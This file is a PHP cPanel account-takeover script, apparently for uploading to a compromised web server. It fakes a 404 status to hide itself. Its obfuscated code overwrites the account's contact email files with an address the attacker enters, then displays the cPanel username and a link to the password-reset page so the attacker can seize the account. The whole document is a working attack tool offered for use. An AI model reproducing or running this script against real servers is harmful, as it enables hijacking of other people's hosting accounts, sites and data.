<?php 
error_reporting(0);
header("HTTP/1.0 404 Not Found");
echo '<!DOCTYPE HTML>
<html>
<head>
<title>Cpanel Reset Password</title>
<style type="text/css">
html {
    margin: 20px auto;
    background: #000000;
    color: green;
    text-align: center;
}
header {
    color: green;
    margin: 10px auto;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: red;
    background: transparent;
    border: 1px dotted green;
    margin-left: 20px;
    text-align: center;
}
a {
    text-decoration: none;
    color: green;
}
</style> 	
</head>
<center>
<header>
    <pre>
   
 __________                          ___________           _________         
\______   \ ____   ______ ______ ___\__    ___/__________ \_   ___ \______  
 |       _// __ \ /  ___//  ___// __ \|    |_/ __ \_  __ \/    \  \/\____ \ 
 |    |   \  ___/ \___ \ \___ \\  ___/|    |\  ___/|  | \/\     \___|  |_> >
 |____|_  /\___  >____  >____  >\___  >____| \___  >__|____\______  /   __/ 
        \/     \/     \/     \/     \/           \/  /_____/      \/|__|    
 
    - Cpanel Reset Password - Coded By SadCode.org V.0.1-
 
    </pre>
</header>
</center>
<form action="#" method="post"> 	
<input type="email" name="email" placeholder="Email kalian" /> 	
<input type="submit" name="submit" value="Crack"/> 	
</form> 	 	
<br/><br/><br/> 	
</p>'; ?> 
<?php
$IIIIIIIIIIII = get_current_user(); 
$IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; 
$IIIIIIIIIIlI = getenv('REMOTE_ADDR'); 
if (isset($_POST['submit'])) { $email = $_POST['email']; 
$IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); 
$IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; 
$IIIIIIIIIlI1 = "2083"; 
$IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
$read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');
if(!$read_named_conf)
{
echo "<h1>gak bisa di akses goblok</h1><br><br> </pre></center>"; 
}
else
{
echo "<center>Ini User Namenya Salin Lalu Gass <br><br></center>"; 
echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; 
echo '<br/><center><a  target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br><br></center>'; ;}} ?>
</div> 
</div>
</center> 
</body> 
</html>
